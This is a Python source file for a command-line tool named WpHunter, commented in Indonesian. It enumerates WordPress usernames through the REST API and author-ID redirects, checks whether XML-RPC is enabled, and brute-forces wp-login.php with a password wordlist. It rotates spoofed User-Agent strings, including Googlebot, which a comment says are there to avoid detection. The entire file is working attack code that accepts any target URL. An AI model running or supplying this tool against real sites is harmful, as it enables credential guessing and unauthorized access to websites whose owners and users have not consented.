import requests
import random
import time
import sys
import argparse
from tqdm import tqdm
from colorama import Fore, Back, Style, init

# Inisialisasi warna
init(autoreset=True)
INFO = Fore.CYAN + "[*]" + Style.RESET_ALL
SUCCESS = Fore.GREEN + "[+]" + Style.RESET_ALL
WARNING = Fore.YELLOW + "[!]" + Style.RESET_ALL
ERROR = Fore.RED + "[-]" + Style.RESET_ALL

# Banner WPScan-style
BANNER = f"""{Style.BRIGHT}{Fore.RED}
 ⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣶⡞⡀⣤⣬⣴⠀⠀⢳⣶⣶⣤⣄⡀                  
 ⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡇⠀⢸⣿⠿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣷⣦.               
 ⠀⠁⠀⠀⠀⠀⢠⡾⣫⣿⣻⣿⣽⣿⡇⠀⠈⢿⣧⡝⠟⠀⠀⢸⣿⣿⣿⣿⣿⣟⢷⣄              
 ⠀⠀⠀⠀⠀⢠⣯⡾⢿⣿⣿⡿⣿⣿⣿⣆⣠⣶⣿⣿⣷⣄⣰⣿⣿⣿⣿⣿⣿⣿⢷⣽⣄             
 ⠀⠐⡀⠀⢠⣿⢋⠴⠋⣽⠋⡸⢱⣯⡿⣿⠏⣡⣿⣽⡏⠹⣿⣿⣿⡎⢣⠙⢿⡙⠳⡙⢿⠄            
 ⠀⠀⡂⠀⣰⢣⣃⠀⠊⠀⠀⠁⠘⠏⠁⠁⠸⣶⣿⡿⢿⡄⠈⠀⠁⠃⠈⠂⠀⠑⠠⣈⡈⣧            
 ⠀⠀⠂⠀⡏⡘⠁⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⢀⡥⢄⢸⡇⠀⠀⠀⠀⢀⠀⠀⠀⠀⠈⢳⢸ {Back.BLACK}{Fore.WHITE}{Style.BRIGHT}WpHunter {Back.BLACK}{Fore.RED}v1.0.3{Style.RESET_ALL}{Style.BRIGHT}{Fore.RED}
 ⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠸⣄⣸⠟⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠈⠇            
 ⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠂⠀⠀⠀⠀⡴⠋⠀⠀⠀⠀⠀⠁⠀⠄⠀⠀⠀⠀⠀⠈            
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡳⣶⣄                         
{Style.RESET_ALL}"""

# User-Agent untuk menghindari deteksi
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.6 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Brave/122.0.0.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (Android 10; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 OPR/79.0.4143.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Brave/110.0.0.0",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]

# Fungsi mengirim request dengan error handling
def send_request(url):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        response = requests.get(url, headers=headers, allow_redirects=True, timeout=10)
        return response
    except requests.exceptions.RequestException:
        print(f"{ERROR} Gagal mengakses {url}.")
        return None

# Enumerasi user dari WP JSON API tanpa mengubah format username
def get_users_from_api(site):
    print(f"{INFO} Mencoba enumerasi user dari WP JSON API ...")
    url = f"{site}/wp-json/wp/v2/users/"
    response = send_request(url)
    if response and response.status_code == 200:
        try:
            # Gunakan "name" asli agar username tidak berubah (misal "dani ramadhan" bukan "dani-ramadhan")
            return list(set(user["name"] for user in response.json()))
        except Exception as e:
            return []
    return []

# Enumerasi user dari Author ID tanpa mengubah format username
def get_users_from_authors(site, max_authors=10):
    print(f"{INFO} Mencoba enumerasi user dari Author ID ...")
    users = set()
    for i in range(1, max_authors + 1):
        url = f"{site}/?author={i}"
        response = send_request(url)
        if response and response.status_code == 200 and response.url != url:
            username = response.url.split("/author/")[-1].strip("/")
            if username:
                # Mengembalikan format username dengan mengganti "-" dengan spasi
                username = username.replace("-", " ")
                users.add(username)
    return list(users)

# Mengecek apakah XML-RPC aktif
def check_xmlrpc(site):
    print(f"{INFO} Mengecek apakah XML-RPC aktif ...")
    url = f"{site}/xmlrpc.php"
    response = send_request(url)
    if response and response.status_code == 405 and "XML-RPC server accepts POST requests only" in response.text:
        print(f"{SUCCESS} XML-RPC ditemukan! Bisa dieksploitasi untuk brute force.")
    else:
        print(f"{ERROR} XML-RPC tidak ditemukan atau tidak aktif.")

# Brute force login WordPress
def brute_force(login_url, usernames, wordlist_path):
    session = requests.Session()
    
    try:
        with open(wordlist_path, "r") as file:
            passwords = [line.strip() for line in file]

        print(f"\n{INFO} Memulai brute force pada: {login_url}")
        time.sleep(1)

        for username in usernames:
            print(f"\n{INFO} Mencoba username: {username}")

            for password in tqdm(passwords, desc=f"   {username}", unit="attempt"):
                headers = {"User-Agent": random.choice(USER_AGENTS), "Referer": login_url}
                data = {"log": username, "pwd": password, "wp-submit": "Log In"}

                print(f"\r[*] Mencoba username: {username} | Password: {password}", end="", flush=True)

                response = session.post(login_url, data=data, headers=headers, allow_redirects=False)

                if response.status_code == 302 and "wp-admin" in response.headers.get("Location", ""):
                    print(f"\n{SUCCESS} Login sukses! Username: {username} | Password: {password}\n")
                    return

        print(f"\n{ERROR} Tidak ada password yang cocok dalam wordlist untuk user: {username}")

    except FileNotFoundError:
        print(f"{WARNING} Wordlist tidak ditemukan.")
    except KeyboardInterrupt:
        print(f"\n{ERROR} Program dihentikan oleh pengguna.")
        sys.exit(1)
    except Exception as e:
        print(f"{ERROR} Terjadi kesalahan: {e}")

# Main function
if __name__ == "__main__":
    # Tampilkan banner
    print(BANNER)
    
    parser = argparse.ArgumentParser(description="WordPress Username Enumeration & Brute Force")
    parser.add_argument("-u", "--url", required=True, help="URL target (contoh: http://example.com)")
    parser.add_argument("-b", "--bruteforce", action="store_true", help="Jalankan brute force setelah enumerasi")
    parser.add_argument("-w", "--wordlist", help="Path file wordlist (hanya jika --bruteforce digunakan)")
    parser.add_argument("-user", "--username", help="Gunakan username tertentu (bisa lebih dari satu, pisahkan dengan koma)")

    args = parser.parse_args()
    target_url = args.url.strip()
    
    if not target_url.startswith("http"):
        print(f"{ERROR} URL harus diawali dengan http:// atau https://")
        sys.exit(1)

    try:
        # Jika user diberikan langsung
        if args.username:
            usernames = list(set(args.username.split(",")))  # Hindari username ganda
            print(f"{INFO} Menggunakan username: {', '.join(usernames)}")

        else:
            # Enumerasi username
            print(f"{SUCCESS} Mencari user pada {target_url} ...")
            usernames = list(set(get_users_from_api(target_url) + get_users_from_authors(target_url)))

            if not usernames:
                print(f"{ERROR} Tidak ada username yang ditemukan.")
                sys.exit(1)

            print(f"\n{SUCCESS} Username yang ditemukan:")
            for user in usernames:
                print(f"    {SUCCESS} {user}")

        # Mengecek XML-RPC
        check_xmlrpc(target_url)

        # Jika mode brute force aktif
        if args.bruteforce and args.wordlist:
            brute_force(f"{target_url}/wp-login.php", usernames, args.wordlist)

    except KeyboardInterrupt:
        print(f"\n{ERROR} Program dihentikan oleh pengguna.")
        sys.exit(1)
